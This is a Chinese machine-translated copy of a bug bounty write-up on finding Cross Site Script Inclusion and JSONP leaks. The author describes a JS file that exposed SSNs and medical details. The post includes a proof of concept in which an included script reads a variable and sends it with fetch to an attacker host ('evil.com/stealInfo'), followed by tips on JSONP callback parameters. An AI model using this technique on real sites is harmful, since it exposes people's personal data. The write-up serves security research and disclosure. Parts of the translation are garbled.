<html>
<head>
<title>Effortlessly finding Cross Site Script Inclusion (XSSI) &amp; JSONP for bug bounty</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">轻松找到跨站点脚本包含(XSSI)和JSONP以获取bug赏金</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/effortlessly-finding-cross-site-script-inclusion-xssi-jsonp-for-bug-bounty-38ae0b9e5c8a?source=collection_archive---------1-----------------------#2019-12-27">https://infosecwriteups.com/effortlessly-finding-cross-site-script-inclusion-xssi-jsonp-for-bug-bounty-38ae0b9e5c8a?source=collection_archive---------1-----------------------#2019-12-27</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="8819" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">嘿，大家好，我最近报告了一个私人程序的XSSI错误，该程序向最初的报告者支付了$̶3̶0̶0̶(800美元，2020年2月13日更新)。我b̶e̶l̶i̶e̶v̶e̶̶t̶h̶e̶̶r̶e̶p̶o̶r̶t̶e̶r̶̶i̶s̶̶u̶n̶d̶e̶r̶p̶a̶i̶d̶̶s̶i̶n̶c̶e̶̶s̶e̶r̶i̶o̶u̶s̶̶i̶n̶f̶o̶r̶m̶a̶t̶i̶o̶n̶̶w̶a̶s̶̶l̶e̶a̶k̶e̶d̶̶̶\̶_̶(̶ツ̶)̶_̶/̶̶,̶̶&amp;̶决定分享我遵循的方法。</p><p id="f329" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">TL；博士(同时阅读底部的重要注释)</strong></p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi kl"><img src="../Images/85a06641ed8e8b6f00dff00e0f5a179b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4lJ1sLR4IluFm6eE4KV_jQ.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated"><strong class="bd lb">小抄什么的idk lol </strong></figcaption></figure><p id="ed1a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">很好的读物，以防你是XSSI/JSONP的新手:<br/><strong class="jp ir">XSSI:</strong><code class="fe lc ld le lf b"><a class="ae lg" href="https://www.scip.ch/en/?labs.20160414" rel="noopener ugc nofollow" target="_blank"><strong class="jp ir">https://www.scip.ch/en/?labs.20160414</strong></a><strong class="jp ir"><br/></strong></code><strong class="jp ir">JSONP:</strong><code class="fe lc ld le lf b"><a class="ae lg" href="https://www.sjoerdlangkemper.nl/2019/01/02/jsonp/" rel="noopener ugc nofollow" target="_blank"><strong class="jp ir">https://www.sjoerdlangkemper.nl/2019/01/02/jsonp</strong></a></code></p><p id="53ba" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">我的方法论</strong>:</p><ul class=""><li id="1057" class="lh li iq jp b jq jr ju jv jy lj kc lk kg ll kk lm ln lo lp bi translated">在搜索了网站(手动和自动)后，我通过<strong class="jp ir"> MIME </strong>类型过滤了<em class="lq"> Burp suite </em>中的结果，然后浏览了“<strong class="jp ir"> script </strong>类型的响应以获取敏感信息。</li></ul><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi lr"><img src="../Images/042a86928baf8e0734a6d2f5c091acf1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OgZGYuhITMyeFr7gjVxkEA.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated"><strong class="bd lb">按MIME类型过滤</strong></figcaption></figure><ul class=""><li id="5473" class="lh li iq jp b jq jr ju jv jy lj kc lk kg ll kk lm ln lo lp bi translated">我找到了一个JS文件，其中包含了我在签署保险单时填写的所有信息。这包括SSN，有限的病史，签证信息，姓名，电话号码，出生日期，地址等。<strong class="jp ir"> <em class="lq"> Yikes </em> </strong>。</li><li id="eeca" class="lh li iq jp b jq ls ju lt jy lu kc lv kg lw kk lm ln lo lp bi translated">我查看了JS文件的HTTP GET请求，以确保它<strong class="jp ir">不需要<strong class="jp ir"> CORS触发</strong>头，比如:<br/>授权、X-API-KEY、X-CSRF-令牌、X-等等</strong></li><li id="d9f3" class="lh li iq jp b jq ls ju lt jy lu kc lv kg lw kk lm ln lo lp bi translated">在这个阶段，如果<strong class="jp ir">没有</strong>的CORS头球，那么<strong class="jp ir">的攻击就会失败</strong>，<strong class="jp ir">除非</strong>我也发现了一个CORS问题。</li></ul><p id="d713" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这种情况下，不需要特殊的头，所以我可以用脚本标记将JS文件包含在web页面上，并将其发送到任何泄漏一些严重PII的服务器，POC类似于:</p><p id="a81f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe lc ld le lf b"><strong class="jp ir">&lt;script src="https://target.com/vuln.js"&gt;<br/>&lt;/script&gt;<br/>&lt;script defer&gt;<br/>// var_name is a variable in vuln.js holding sensitive information<br/>console.log(var_name);<br/>// sending information to an attacker controlled server<br/>fetch("https://evil.com/stealInfo?info="+var_name);<br/>&lt;/script&gt;</strong></code></p><p id="5f50" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">通过在所有返回敏感信息的路径上附加callback=some_function，jsonp=blah这样的参数，可以使用相同的方法来查找JSONP回调。</p><p id="e08d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">重要提示:</strong></p><ul class=""><li id="19b9" class="lh li iq jp b jq jr ju jv jy lj kc lk kg ll kk lm ln lo lp bi translated">有时您需要多个参数来触发JSONP响应。比如:【http://target.com】T2？回调=测试→ <strong class="jp ir">无JSONP<br/>T5】http://target.com？<strong class="jp ir"> type=jsonp &amp;回调=测试</strong> <strong class="jp ir"> →返回JSONP </strong></strong></li><li id="b54c" class="lh li iq jp b jq ls ju lt jy lu kc lv kg lw kk lm ln lo lp bi translated">如果响应有<strong class="jp ir">Content-Type:application/JSON</strong>但是主体有JSONP/javascript，并且响应中的<strong class="jp ir">X-Content-Type-Options:nosniff</strong>头是<strong class="jp ir">而不是</strong>，那么漏洞利用仍然<strong class="jp ir">起作用</strong>。</li><li id="a8b3" class="lh li iq jp b jq ls ju lt jy lu kc lv kg lw kk lm ln lo lp bi translated">对于<strong class="jp ir"> JSONP，不同的</strong>回调参数可能在<strong class="jp ir">不同的端点上工作，甚至在同一个网站上。<br/>举例:<br/></strong>https://target.com/profile_info?<strong class="jp ir">回调</strong>=测试→ <strong class="jp ir">无JSONP</strong><br/>https://target.com/profile_info?<strong class="jp ir">JSONP =</strong>测试→ <strong class="jp ir">返回JSONP </strong> <br/> <strong class="jp ir">但是，在同一站点的不同路径上:<br/></strong>https://target.com/<strong class="jp ir">account _ info</strong>？<strong class="jp ir">JSONP</strong>= test→<strong class="jp ir">no JSONP</strong>T43】https://target.com/<strong class="jp ir">account _ info</strong>？<strong class="jp ir">jsoncallback</strong>= test→<strong class="jp ir">returns</strong><strong class="jp ir">JSONP</strong></li></ul><p id="d74e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">感谢反馈和建设性的批评，感谢阅读！</p></div><div class="ab cl lx ly hu lz" role="separator"><span class="ma bw bk mb mc md"/><span class="ma bw bk mb mc md"/><span class="ma bw bk mb mc"/></div><div class="ij ik il im in"><p id="45ef" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="lq">关注</em> <a class="ae lg" href="https://medium.com/bugbountywriteup" rel="noopener"> <em class="lq"> Infosec报道</em> </a> <em class="lq">获取更多此类精彩报道。</em></p><div class="me mf gp gr mg mh"><a href="https://medium.com/bugbountywriteup" rel="noopener follow" target="_blank"><div class="mi ab fo"><div class="mj ab mk cl cj ml"><h2 class="bd ir gy z fp mm fr fs mn fu fw ip bi translated">信息安全报道</h2><div class="mo l"><h3 class="bd b gy z fp mm fr fs mn fu fw dk translated">收集了世界上最好的黑客的文章，主题从bug奖金和CTF到vulnhub…</h3></div><div class="mp l"><p class="bd b dl z fp mm fr fs mn fu fw dk translated">medium.com</p></div></div><div class="mq l"><div class="mr l ms mt mu mq mv kv mh"/></div></div></a></div></div></div>    
</body>
</html>